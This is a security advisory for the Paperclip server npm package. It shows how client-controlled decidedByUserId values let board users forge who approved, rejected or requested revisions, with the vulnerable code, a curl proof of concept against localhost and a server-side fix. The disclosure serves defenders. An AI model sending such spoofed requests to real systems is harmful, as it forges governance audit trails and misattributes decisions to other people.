# [M] Paperclip: Approval decision attribution spoofing via client-controlled `decidedByUserId` in paperclip server

## Summary
Severity: Medium
Advisory: GHSA-p7mm-r948-4q3q
CWE: CWE-345
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-p7mm-r948-4q3q
Type: github-advisory

## Affected
- npm: `@paperclipai/server` — affected >=0 <2026.416.0

## Details
## Summary

The approval-resolution endpoints (`POST /approvals/:id/approve`, `/reject`, `/request-revision`) accept a client-supplied `decidedByUserId` field in the request body and write it verbatim into the authoritative `approvals.decidedByUserId` column — without cross-checking it against the authenticated actor. Any board user who can access an approval's company can record the decision as having been made by another user (e.g. the CEO), forging the governance audit trail. For `hire_agent` approvals with a monthly budget, the same attacker-controlled string is also stamped onto the resulting `budget_policies` row as `createdByUserId`/`updatedByUserId`.

## Details

**Entry point** — `server/src/routes/approvals.ts:130`:

```ts
router.post("/approvals/:id/approve", validate(resolveApprovalSchema), async (req, res) => {
  assertBoard(req);
  const id = req.params.id as string;
  if (!(await requireApprovalAccess(req, id))) {
    res.status(404).json({ error: "Approval not found" });
    return;
  }
  const { approval, applied } = await svc.approve(
    id,
    req.body.decidedByUserId ?? "board",   // ← client-controlled
    req.body.decisionNote,
  );
```

**Authorization check** — `server/src/routes/authz.ts:4`:

```ts
export function assertBoard(req: Request) {
  if (req.actor.type !== "board") {
    throw forbidden("Board access required");
  }
}
```

`assertBoard` only checks that the caller is some board user; it never ties `req.body.decidedByUserId` to `req.actor.userId`. `requireApprovalAccess`/`assertCompanyAccess` only verify the attacker is allowed to touch the approval's company, which every board user in that company already is.

**Validator** — `packages/shared/src/validators/approval.ts:13`:

```ts
export const resolveApprovalSchema = z.object({
  decisionNote: z.string().optional().nullable(),
  decidedByUserId: z.string().optional().default("board"),
});
```

The Zod schema accepts any string for `decidedByUserId` — no UUID check, no membership check, no binding to the session.

**Sink** — `server/src/services/approvals.ts:54`:

```ts
const updated = await db
  .update(approvals)
  .set({
    status: targetStatus,
    decidedByUserId,               // ← attacker-chosen value written verbatim
    decisionNote: decisionNote ?? null,
    decidedAt: now,
    updatedAt: now,
  })
  .where(and(eq(approvals.id, id), inArray(approvals.status, resolvableStatuses)))
  .returning()
```

**Secondary sink (budget policies)** — `server/src/services/approvals.ts:147-156`, reached when a `hire_agent` approval with `budgetMonthlyCents > 0` is approved:

```ts
if (budgetMonthlyCents > 0) {
  await budgets.upsertPolicy(
    updated.companyId,
    { scopeType: "agent", scopeId: hireApprovedAgentId, amount: budgetMonthlyCents, windowKind: "calendar_month_utc" },
    decidedByUserId,              // ← forwarded as actorUserId
  );
}
```

`budgets.upsertPolicy` uses that `actorUserId` to populate `createdByUserId`/`updatedByUserId` on the `budget_policies` row, extending the forgery to budget-policy audit columns.

**Same pattern in `reject` and `request-revision`** — `server/src/routes/approvals.ts:229` and `:257`:

```ts
router.post("/approvals/:id/reject", validate(resolveApprovalSchema), async (req, res) => {
  assertBoard(req);
  ...
  const { approval, applied } = await svc.reject(id, req.body.decidedByUserId ?? "board", req.body.decisionNote);
```

`approvalService.reject()` and `requestRevision()` (`approvals.ts:175` and `:201`) both write `decidedByUserId` directly into the approvals row.

**Why `logActivity` is not a mitigation**: the route handlers correctly use `req.actor.userId ?? "board"` when writing to `activity_log` (e.g. `approvals.ts:151`, `175`, `190`, `212`, `246`, `276`), which shows the developer intent was that the deciding user equals the authenticated user. But the authoritative `approvals.decidedByUserId` column — the value shown to anyone reviewing the approval — is still sourced from the client, so the two records are allowed to diverge and the user-visible attribution is the forged one.

**Why this is reachable from a non-admin attacker**: `actorMiddleware` (`server/src/middleware/auth.ts:62-98`) populates `req.actor` as `type: "board"` for any authenticated user (session cookie or board API key); `isInstanceAdmin` is not consulted by `assertBoard`. In a multi-user `authenticated` deployment, any board member of a company can spoof the attribution of any other board member for approvals within that company. In `local_trusted` deployments there is only a single implicit `local-board` user, so the exploit has no target — but the code is shipped for both deployment modes.

## PoC

Prerequisite: a pending `hire_agent` approval `$APPROVAL_ID` in a company where both `attacker@corp` and `ceo@corp` are board members of the `authenticated` deployment. Attacker authenticates with their own session cookie / board API key.

1. Attacker approves as the CEO:

```bash
curl -X POST http://localhost:3000/approvals/$APPROVAL_ID/approve \
  -H 'Content-Type: application/json' \
  -H "Cookie: $ATTACKER_SESSION" \
  -d '{"decidedByUserId":"ceo@corp","decisionNote":"LGTM"}'
```

2. Verify the forged attribution is stored on the authoritative row:

```bash
curl http://localhost:3000/approvals/$APPROVAL_ID \
  -H "Cookie: $ATTACKER_SESSION" | jq '.decidedByUserId'
# => "ceo@corp"
```

3. For `hire_agent` approvals with `budgetMonthlyCents > 0`, confirm the budget-policy row is also stamped with the forged user (direct DB read, or via an endpoint that surfaces `budget_policies.createdByUserId`):

```sql
SELECT scope_id, amount, created_by_user_id, updated_by_user_id
FROM budget_policies
WHERE scope_type = 'agent'
ORDER BY created_at DESC LIMIT 1;
-- created_by_user_id = 'ceo@corp'
-- updated_by_user_id = 'ceo@corp'
```

4. The same body works against `/approvals/$APPROVAL_ID/reject` and `/approvals/$APPROVAL_ID/request-revision`.

Note: the `activity_log` row written alongside the approval still shows the real attacker's `userId` (correctly taken from `req.actor.userId`), so a defender who looks at `activity_log` will see the discrepancy — but the approval UI, the approvals API, and the budget_policies audit columns all display the forged user.

## Impact

- **Forged governance audit trail.** Any board user with access to a company can record approval, rejection, or revision-request decisions under any arbitrary user identifier — including other legitimate board users of that company. Approvals gate security-sensitive actions (agent hiring, which grants execution privileges and assigns a monthly spend budget), and the `approvals.decidedByUserId` column is the authoritative record of who authorized each decision.
- **Budget-policy attribution forgery.** For `hire_agent` approvals that carry a monthly budget, `budget_policies.createdByUserId` / `updatedByUserId` are also populated from the same attacker-controlled string, spreading the forgery to spend-authorization audit columns.
- **Non-repudiation break.** A board user can frame another board user for approving/rejecting a hire, undermining accountability for governance actions. The parallel `activity_log` entry does preserve the true actor, but any reviewer inspecting the approval itself (not the activity log) will see the forged attribution as fact.
- **Scope.** Limited to board users who already have company access; does not escalate privileges, does not leak data, and does not change whether the decision itself gets applied. Integrity impact is Low (attribution only, not decision content); confidentiality and availability are unaffected.

## Recommended Fix

Drop `decidedByUserId` from the request schema entirely and derive it server-side from the authenticated actor. Treat `req.body.decidedByUserId` as untrusted and ignore it.

**`packages/shared/src/validators/approval.ts`:**

```ts
export const resolveApprovalSchema = z.object({
  decisionNote: z.string().optional().nullable(),
  // decidedByUserId removed — server derives from req.actor
});

export const requestApprovalRevisionSchema = z.object({
  decisionNote: z.string().optional().nullable(),
});
```

**`server/src/routes/approvals.ts`** (apply to `/approve`, `/reject`, `/request-revision`):

```ts
router.post("/approvals/:id/approve", validate(resolveApprovalSchema), async (req, res) => {
  assertBoard(req);
  const id = req.params.id as string;
  if (!(await requireApprovalAccess(req, id))) {
    res.status(404).json({ error: "Approval not found" });
    return;
  }
  const decidedBy = req.actor.userId ?? "board";   // trust the session, not the body
  const { approval, applied } = await svc.approve(id, decidedBy, req.body.decisionNote);
  ...
});
```

Repeat the same `const decidedBy = req.actor.userId ?? "board";` substitution at `approvals.ts:238` (`/reject`) and `:269` (`/request-revision`). No change is needed inside `approvalService` — it already accepts the value as a parameter — and this also ensures the forged value cannot reach `budgets.upsertPolicy` at `approvals.ts:155`. Existing callers that currently pass a body `decidedByUserId` can be updated to stop sending it (it is already effectively redundant with the session).

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-p7mm-r948-4q3q
- https://github.com/paperclipai/paperclip
